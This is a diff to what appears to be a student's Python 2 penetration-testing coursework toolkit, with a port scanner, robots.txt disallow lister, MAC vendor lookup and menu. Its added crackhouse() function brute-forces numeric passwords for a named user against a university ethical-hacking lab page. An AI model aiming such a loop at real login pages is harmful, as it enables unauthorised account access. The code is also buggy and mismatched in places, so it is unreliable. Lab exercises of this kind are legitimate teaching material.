@@ -3,40 +3,6 @@ import requests
 import subprocess
 import robotparser
 
-def amazingMenu():
-    """ Display an amazing Banner and the Menu for the tool to instantly impress the users."""
-    print (30 * '-')
-    print ("   M A I N - M E N U")
-    print (30 * '-')
-    print ("1. scanport")
-    print ("2. crackHouse")
-    print ("3. listRestricted")
-    print ("4. identifyOUI")
-    print ("5. generateReport")
-    print (30 * '-')
-
-    choice = input('Enter your choice [1-5] : ')
-
-    choice = int(choice)
-    if choice == 1:
-        print ("Starting scanport...")
-        scanport()
-    elif choice == 2:
-        print ("Starting crackHouse...")
-        crackHouse()
-    elif choice == 3:
-        print ("Starting listRestricted...")
-        listRestricted()
-    elif choice == 4:
-        print ("Starting indentifyOUI...")
-        identifyOUI()
-    elif choice == 5:
-        print ("Starting generateReport...")
-        generateReport()
-    else:
-        print ("Invalid number. Try again...")
-    print ('YAPTF: by DiamondHouse inc.')
-
 host = " "
 port = " "
 
@@ -57,10 +23,52 @@ def scanport(host, port):
         return "Port "+str(port)+" is closed."
     s.close()
     return "Port "+str(port)+" is open!"
+    
 
-printer = scanport(host, port)
-print(printer)
 
+# Still a bit buggy, needs a bit of tweaking........
+
+def crackhouse():
+    """Bruteforce the password for titanium house"""
+
+    for item in range(999):
+        params = {"username":"JoeSmith", "password":item}
+        r = requests.get("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php",
+                         params = params)
+        if r.text.find("incorrect"):
+            print "Fails on {0}".format(item)
+        else:
+            print "Passcode {0} Ok".format(item)
+            return item
+
+
+
+
+#This needs a bit more tweaking to get it working:
+
+def listRestricted():
+    """ Return the restricted folders from a webpage based on the robots.txt file. """
+    sites = ['www.google.com','www.coventry.ac.uk', 'www.yahoo.com']
+    
+    def getDenies(site):
+        """ Create a new robotparser instance and read the site's robots file"""
+        paths =[]
+        robot = robotparser.RobotFileParser()
+        robot.set_url("http://"+site+"/robots.txt")
+        robot.read()
+
+        print robot.entries
+        
+        # For each entry, look at the rule lines and add the path to paths if disallowed.
+        for entry in robot.entries:
+            for line in entry.rulelines:
+                not line.allowance and paths.append(line.path)
+        return set(paths)
+
+    for site in sites:
+        print "Denies for " +site
+        print "\t" + "\n\t".join(getDenies(site))
+        
 
 def identifyOUI():
     macaddress = raw_input("Search MAC address: ")
@@ -72,3 +80,61 @@ def identifyOUI():
         if macaddress in line: print line
     database.close()
     identifyOUI()
+
+
+def generateReport():
+    """This function should take all the output from the selected tunctionality and save it to a file of some sort."""
+    
+    #listRestricted()
+    #print scanport("127.0.0.1",8000)
+    #print crackhouse()
+    #print listrestricted
+    print("Documentation generated and saved to file.")
+
+    
+
+# Below I can test all the custom functionality that I am writing, just by calling the function
+
+#if __name__ == "__main__":
+    #amazingMenu()
+    #listRestricted()
+    #identifyOUI("A4:18:75")
+    #print scanport("127.0.0.1",8000)
+    #print crackhouse()
+    #print listrestricted
+
+def amazingMenu():
+    """ Display an amazing Banner and the Menu for the tool to instantly impress the users."""
+    print (30 * '-')
+    print ("   M A I N - M E N U")
+    print (30 * '-')
+    print ("1. scanport")
+    print ("2. crackHouse")
+    print ("3. listRestricted")
+    print ("4. identifyOUI")
+    print ("5. generateReport")
+    print (30 * '-')
+
+    choice = input('Enter your choice [1-5] : ')
+
+    choice = int(choice)
+    if choice == 1:
+        print ("Starting scanport...")
+        print scanport(host, port)
+    elif choice == 2:
+        print ("Starting crackHouse...")
+        crackHouse()
+    elif choice == 3:
+        print ("Starting listRestricted...")
+        listRestricted()
+    elif choice == 4:
+        print ("Starting indentifyOUI...")
+        identifyOUI()
+    elif choice == 5:
+        print ("Starting generateReport...")
+        generateReport()
+    else:
+        print ("Invalid number. Try again...")
+    print ('YAPTF: by DiamondHouse inc.')
+
+amazingMenu()
